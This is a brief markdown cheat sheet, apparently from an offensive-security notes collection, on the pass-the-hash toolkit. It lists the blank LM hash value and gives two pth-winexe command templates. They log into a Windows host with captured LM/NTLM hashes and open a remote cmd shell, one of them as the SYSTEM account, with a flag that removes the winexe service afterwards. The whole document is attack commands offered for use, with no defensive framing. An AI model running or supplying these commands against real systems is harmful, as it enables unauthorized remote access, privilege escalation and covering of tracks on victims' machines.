# pth

pass-the-hash toolkit

empty/blank LM password hash: `AAD3B435B51404EEAAD3B435B51404EE`

## interactive shell

* uninstall winexe service after remote execution

```
pth-winexe -U [domain/]<user>%'<LM hash>:<NTLM hash>' --uninstall //<host> cmd
```

## interactive shell via `system` account

```
pth-winexe -U [domain/]administrator%'<LM hash>:<NTLM hash>' --uninstall --system //<host> cmd
```
